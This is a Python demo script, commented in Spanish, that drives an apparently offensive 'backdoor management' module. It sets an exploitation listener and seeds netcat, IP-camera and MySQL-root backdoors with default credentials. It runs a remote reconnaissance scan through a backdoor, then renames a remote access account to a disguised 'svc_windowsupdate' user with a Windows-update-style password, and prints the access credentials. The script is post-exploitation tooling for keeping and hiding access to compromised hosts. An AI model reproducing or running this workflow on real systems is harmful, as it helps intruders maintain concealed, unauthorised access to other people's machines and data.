#!/usr/bin/env python3
"""
Demo de Gestión de Backdoors y Accesos Remotos
Ejemplo de uso del módulo de gestión de backdoors
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.backdoor_management import BackdoorManagementModule
from modules.backdoor_menu import BackdoorMenu
import logging

def setup_logging():
    """Configurar logging para el demo"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('backdoor_demo.log')
        ]
    )
    return logging.getLogger(__name__)

def main():
    """Función principal del demo"""
    logger = setup_logging()
    
    # Configuración de ejemplo
    config = {
        'network': {
            'target_network': '192.168.1.0/24',
            'interface': 'eth0'
        },
        'exploitation': {
            'lhost': '192.168.1.100',
            'lport': 4444
        }
    }
    
    logger.info("🚀 INICIANDO DEMO DE GESTIÓN DE BACKDOORS")
    
    # Crear instancia del módulo
    backdoor_module = BackdoorManagementModule(config, logger)
    backdoor_menu = BackdoorMenu(config, logger)
    
    # 1. Descubrir backdoors existentes
    logger.info("🔍 Fase 1: Descubriendo backdoors existentes...")
    backdoors = backdoor_module.discover_existing_backdoors()
    
    if backdoors:
        logger.info(f"✅ Descubiertos {len(backdoors)} backdoors/accesos remotos")
        for i, backdoor in enumerate(backdoors, 1):
            logger.info(f"   {i}. {backdoor['type']} en {backdoor['ip']}:{backdoor.get('port', 'N/A')}")
    else:
        logger.info("❌ No se encontraron backdoors existentes")
        logger.info("💡 Creando backdoors de ejemplo para el demo...")
        
        # Crear backdoors de ejemplo
        example_backdoors = [
            {
                'type': 'netcat',
                'ip': '192.168.1.5',
                'port': '4444',
                'username': 'admin',
                'password': 'admin123',
                'timestamp': 1757184150.567725
            },
            {
                'type': 'camera_access',
                'ip': '192.168.1.218',
                'port': '80',
                'username': 'admin',
                'password': 'admin',
                'access_script': 'camera_access_192.168.1.218.sh',
                'timestamp': 1757184150.567725
            },
            {
                'type': 'database_connection',
                'ip': '192.168.1.7',
                'port': '3306',
                'username': 'root',
                'password': 'root',
                'connection_script': 'db_connection_192.168.1.7_mysql.sh',
                'timestamp': 1757184150.567725
            }
        ]
        
        backdoor_module.active_backdoors["backdoors"] = example_backdoors
        backdoor_module._save_backdoors()
        backdoors = example_backdoors
        
        logger.info(f"✅ Creados {len(backdoors)} backdoors de ejemplo")
    
    # 2. Probar conexiones
    logger.info("🔗 Fase 2: Probando conexiones de backdoors...")
    connections = backdoor_module.test_backdoor_connections()
    
    if connections:
        logger.info(f"✅ {len(connections)} conexiones activas")
        for i, connection in enumerate(connections, 1):
            backdoor = connection['backdoor']
            response_time = connection.get('response_time', 0)
            logger.info(f"   {i}. {backdoor['type']} en {backdoor['ip']}:{backdoor['port']} ({response_time:.2f}s)")
    else:
        logger.info("❌ No se encontraron conexiones activas")
        logger.info("💡 Esto es normal en un demo - los backdoors son de ejemplo")
    
    # 3. Ejecutar escaneo remoto
    logger.info("🚀 Fase 3: Ejecutando escaneo remoto...")
    if backdoors:
        selected_backdoor = backdoors[0]  # Usar el primer backdoor
        logger.info(f"📋 Ejecutando escaneo desde {selected_backdoor['type']} en {selected_backdoor['ip']}")
        
        scan_results = backdoor_module.execute_remote_scan(selected_backdoor, "reconnaissance")
        
        if scan_results['success']:
            logger.info("✅ Escaneo remoto exitoso")
            logger.info(f"   Comandos ejecutados: {len(scan_results['results'].get('commands', []))}")
            logger.info(f"   Salidas capturadas: {len(scan_results['results'].get('output', []))}")
        else:
            logger.info("❌ Escaneo remoto falló")
            if 'error' in scan_results:
                logger.info(f"   Error: {scan_results['error']}")
    else:
        logger.info("❌ No hay backdoors para ejecutar escaneo remoto")
    
    # 4. Gestionar accesos remotos
    logger.info("🔧 Fase 4: Gestionando accesos remotos...")
    remote_access = backdoor_module.list_remote_access()
    
    if remote_access:
        logger.info(f"✅ {len(remote_access)} accesos remotos disponibles")
        for i, access in enumerate(remote_access, 1):
            logger.info(f"   {i}. {access.get('type', 'unknown')} en {access.get('ip', 'unknown')}:{access.get('port', 'unknown')}")
    else:
        logger.info("❌ No hay accesos remotos disponibles")
        logger.info("💡 Creando accesos remotos de ejemplo...")
        
        # Crear accesos remotos de ejemplo
        example_access = [
            {
                'id': 'access_1',
                'type': 'camera_access',
                'ip': '192.168.1.218',
                'port': '80',
                'username': 'admin',
                'password': 'admin',
                'connection_script': 'camera_access_192.168.1.218.sh',
                'timestamp': 1757184150.567725
            },
            {
                'id': 'access_2',
                'type': 'database_connection',
                'ip': '192.168.1.7',
                'port': '3306',
                'username': 'root',
                'password': 'root',
                'connection_script': 'db_connection_192.168.1.7_mysql.sh',
                'timestamp': 1757184150.567725
            }
        ]
        
        backdoor_module.remote_access["remote_access"] = example_access
        backdoor_module._save_remote_access()
        remote_access = example_access
        
        logger.info(f"✅ Creados {len(remote_access)} accesos remotos de ejemplo")
    
    # 5. Modificar acceso remoto
    if remote_access:
        logger.info("🔧 Fase 5: Modificando acceso remoto...")
        access_to_modify = remote_access[0]
        access_id = access_to_modify['id']
        
        logger.info(f"📋 Modificando acceso: {access_to_modify['type']} en {access_to_modify['ip']}:{access_to_modify['port']}")
        
        # Modificaciones de ejemplo
        modifications = {
            'ip': '192.168.1.10',
            'port': '8080',
            'username': 'svc_windowsupdate',
            'password': 'W1nd0ws_Upd@te_2024!'
        }
        
        result = backdoor_module.manage_remote_access(access_id, modifications)
        
        if result['success']:
            logger.info("✅ Acceso modificado exitosamente")
            logger.info("📝 Cambios aplicados:")
            for key, value in modifications.items():
                logger.info(f"   {key}: {value}")
        else:
            logger.info(f"❌ Error modificando acceso: {result.get('error', 'Desconocido')}")
    else:
        logger.info("❌ No hay accesos remotos para modificar")
    
    # 6. Mostrar resumen final
    logger.info("📊 RESUMEN FINAL:")
    logger.info(f"   - Backdoors descubiertos: {len(backdoors)}")
    logger.info(f"   - Conexiones activas: {len(connections)}")
    logger.info(f"   - Accesos remotos: {len(remote_access)}")
    logger.info(f"   - Escaneos ejecutados: {len(backdoor_module.results.get('scans_executed', []))}")
    logger.info(f"   - Accesos modificados: {len(backdoor_module.results.get('access_modified', []))}")
    
    # 7. Mostrar comandos de acceso
    if backdoors:
        logger.info("🔧 COMANDOS DE ACCESO:")
        for i, backdoor in enumerate(backdoors, 1):
            logger.info(f"   {i}. {backdoor['type']} en {backdoor['ip']}:{backdoor.get('port', 'N/A')}")
            if 'username' in backdoor:
                logger.info(f"      Usuario: {backdoor['username']}")
            if 'password' in backdoor:
                logger.info(f"      Contraseña: {backdoor['password']}")
            if 'access_script' in backdoor:
                logger.info(f"      Script: ./{backdoor['access_script']}")
            logger.info("")
    
    logger.info("✅ DEMO COMPLETADO")

if __name__ == "__main__":
    main()
